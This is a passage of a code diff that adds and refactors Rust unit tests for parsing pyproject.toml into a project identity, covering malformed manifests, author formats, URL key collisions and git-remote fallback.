+            logs.contains("recovery=\"keep-first\""),
+            "warn must state the recovery: {logs}"
+        );
+    }
+
+    /// TEST-5 / TASK-1757: the same contract end to end, through a real
+    /// manifest rather than a hand-built map.
+    #[test]
+    fn colliding_url_keys_in_a_manifest_keep_the_first_seen_homepage() {
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
+
+[project.urls]
+Home-Page = "https://first.dev"
+"home page" = "https://second.dev"
+"#,
+        );
+
+        assert_eq!(id.homepage.as_deref(), Some("https://first.dev"));
+    }
+
     #[test]
     fn fallback_to_dir_name_when_no_pyproject() {
         let dir = tempfile::tempdir().unwrap();
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        let id = identity_at(dir.path());
 
         assert_eq!(id.stack_label, "Python");
         assert!(id.version.is_none());
         assert!(id.stack_detail.is_none());
+    }
+
+    /// TEST-5 / TASK-1756: the crate doc promises that a *malformed* manifest
+    /// falls back to defaults *and* says so via `tracing::warn!`, so a broken
+    /// manifest does not silently look like a missing one (TASK-0394 /
+    /// TASK-0974). Both halves were previously unasserted — deleting the warn
+    /// left the suite green.
+    #[test]
+    fn invalid_pyproject_falls_back_to_directory_name_and_warns() {
+        let dir = tempfile::tempdir().unwrap();
+        let manifest = dir.path().join("pyproject.toml");
+        ops_about::test_support::write_file(&manifest, "[project\nname = \"demo\"\n");
+
+        let (id, logs) = capture_warns(|| identity_at(dir.path()));
+
+        assert!(
+            !id.name.is_empty(),
+            "the directory-name fallback must still yield a name"
+        );
+        assert_ne!(id.name, "demo", "the broken manifest must not be trusted");
+        assert!(id.version.is_none(), "got: {:?}", id.version);
+        assert!(id.stack_detail.is_none(), "got: {:?}", id.stack_detail);
+        assert!(
+            logs.contains("recovery=\"default-identity\""),
+            "warn must state the recovery: {logs}"
+        );
+        assert!(
+            logs.contains("pyproject.toml"),
+            "warn must name the manifest path: {logs}"
+        );
+    }
+
+    /// PATTERN-1 / TASK-1774: `authors` written as a list of bare strings is
+    /// the Poetry spelling and is common in the wild. It must not discard the
+    /// rest of `[project]`, and the entries themselves are already in the
+    /// rendered `Name <email>` shape.
+    #[test]
+    fn bare_string_authors_parse_and_keep_the_rest_of_the_project_table() {
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.2.3"
+description = "A demo"
+authors = ["Alice <a@x.com>", "Bob"]
+"#,
+        );
+
+        assert_eq!(id.name, "demo");
+        assert_eq!(id.version.as_deref(), Some("1.2.3"));
+        assert_eq!(id.description.as_deref(), Some("A demo"));
+        assert_eq!(id.authors, vec!["Alice <a@x.com>", "Bob"]);
+    }
+
+    /// PATTERN-1 / TASK-1774: a type mismatch on one `[project]` key must
+    /// degrade that key alone — every other field still populates — and the
+    /// failure must be visible in a warn naming the offending field path.
+    #[test]
+    fn one_malformed_project_field_degrades_only_that_field() {
+        let dir = tempfile::tempdir().unwrap();
+        ops_about::test_support::write_file(
+            &dir.path().join("pyproject.toml"),
+            r#"
+[project]
+name = "demo"
+version = 3
+description = "A demo"
+requires-python = ">=3.11"
+"#,
+        );
+
+        let (id, logs) = capture_warns(|| identity_at(dir.path()));
+
+        assert_eq!(id.name, "demo", "a sibling field must survive");
+        assert_eq!(id.description.as_deref(), Some("A demo"));
+        assert_eq!(id.stack_detail.as_deref(), Some("Python >=3.11"));
+        assert!(id.version.is_none(), "got: {:?}", id.version);
+        assert!(
+            logs.contains("field=project.version"),
+            "warn must name the offending field path: {logs}"
+        );
+        assert!(
+            logs.contains("recovery=\"skip-field\""),
+            "warn must state the recovery: {logs}"
+        );
+    }
+
+    /// PATTERN-1 / TASK-1774: an author entry that is neither the PEP 621
+    /// table nor a bare string is skipped, not fatal to the whole list.
+    #[test]
+    fn unsupported_author_entry_is_skipped_not_fatal() {
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "0.1.0"
+authors = [{ name = "Alice" }, 42]
+"#,
+        );
+
+        assert_eq!(id.name, "demo");
+        assert_eq!(id.authors, vec!["Alice"]);
     }
 
     /// ERR-2 / TASK-0980: an email-only author renders as `<email>` so
@@ -824,9 +1136,7 @@ Documentation = "https://docs.x"
     /// renders ambiguously in a multi-author card.
     #[test]
     fn email_only_author_renders_with_angle_brackets() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
@@ -835,22 +1145,14 @@ authors = [
     { email = "a@example.com" },
 ]
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert_eq!(id.authors, vec!["<a@example.com>".to_string()]);
     }
 
     #[test]
     fn author_with_name_and_email() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
@@ -860,37 +1162,24 @@ authors = [
     { name = "Bob" },
 ]
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert_eq!(id.authors, vec!["Alice <a@example.com>", "Bob"]);
     }
 
     #[test]
     fn git_remote_fallback_when_no_repository_url() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
-            "[project]\nname = \"demo\"\nversion = \"0.1.0\"\n",
-        )
-        .unwrap();
-        let git_dir = dir.path().join(".git");
-        std::fs::create_dir(&git_dir).unwrap();
-        std::fs::write(
-            git_dir.join("config"),
-            "[remote \"origin\"]\n\turl = https://github.com/o/r.git\n",
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        let id = identity_from_with_files(
+            r#"
+[project]
+name = "demo"
+version = "0.1.0"
+"#,
+            &[(
+                ".git/config",
+                "[remote \"origin\"]\n\turl = https://github.com/o/r.git\n",
+            )],
+        );
 
         assert_eq!(id.repository.as_deref(), Some("https://github.com/o/r"));
     }
